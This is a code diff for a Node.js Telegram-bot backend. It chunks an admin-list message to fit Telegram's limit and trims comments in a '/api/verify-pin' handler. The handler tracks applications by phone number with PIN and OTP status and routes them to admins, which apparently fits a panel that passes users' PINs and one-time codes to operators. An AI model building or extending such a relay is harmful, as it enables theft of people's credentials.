@@ -1131,16 +1131,19 @@ Please contact the super admin if you have questions.
         try {
             const allAdmins = await db.getAllAdmins();
             
-            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
-            
+            // ✅ FIX: Split into chunks to avoid Telegram 4096 char limit
+            const MAX_LENGTH = 3500;
+            const chunks = [];
+            let current = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
+
             allAdmins.forEach((admin, index) => {
                 const isSuperAdmin = admin.adminId === 'ADMIN001';
                 const isPaused = pausedAdmins.has(admin.adminId);
                 const isConnected = adminChatIds.has(admin.adminId);
-                
+
                 let statusEmoji = '✅';
                 let statusText = 'Active';
-                
+
                 if (isSuperAdmin) {
                     statusEmoji = '⭐';
                     statusText = 'Super Admin';
@@ -1148,22 +1151,31 @@ Please contact the super admin if you have questions.
                     statusEmoji = '🚫';
                     statusText = 'Paused';
                 }
-                
+
                 const connectionStatus = isConnected ? '🟢' : '⚪';
-                
-                message += `${index + 1}. ${statusEmoji} *${admin.name}*\n`;
-                message += `   📧 ${admin.email}\n`;
-                message += `   🆔 \`${admin.adminId}\`\n`;
-                message += `   ${connectionStatus} Status: ${statusText}\n`;
-                if (admin.chatId) {
-                    message += `   💬 Chat: \`${admin.chatId}\`\n`;
+
+                const entry = `${index + 1}. ${statusEmoji} *${admin.name}*\n` +
+                    `   📧 ${admin.email}\n` +
+                    `   🆔 \`${admin.adminId}\`\n` +
+                    `   ${connectionStatus} Status: ${statusText}\n` +
+                    (admin.chatId ? `   💬 Chat: \`${admin.chatId}\`\n` : '') +
+                    `\n`;
+
+                if ((current + entry).length > MAX_LENGTH) {
+                    chunks.push(current);
+                    current = entry;
+                } else {
+                    current += entry;
                 }
-                message += `\n`;
             });
-            
-            message += `\n🟢 = Connected | ⚪ = Not Connected`;
-            
-            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+
+            current += `\n🟢 = Connected | ⚪ = Not Connected`;
+            chunks.push(current);
+
+            // Send all chunks sequentially
+            for (const chunk of chunks) {
+                await bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
+            }
             
         } catch (error) {
             console.error('❌ Error listing admins:', error);
@@ -1829,7 +1841,6 @@ app.post('/api/verify-pin', async (req, res) => {
         }
 
         // ✅ FIX 2: Returning user check — ONLY look at THIS admin's own applications
-        // No cross-admin data lookup — each admin only sees their own customers
         const thisAdminApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const thisAdminPastApps = thisAdminApps
             .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
@@ -1878,7 +1889,7 @@ app.post('/api/verify-pin', async (req, res) => {
             otpStatus: 'pending',
             assignmentType: assignmentType || 'auto',
             isReturningUser: isReturningUser,
-            previousCount: thisAdminPastApps.length, // ✅ FIX 3: use scoped count
+            previousCount: thisAdminPastApps.length,
             timestamp: new Date().toISOString()
         });
 
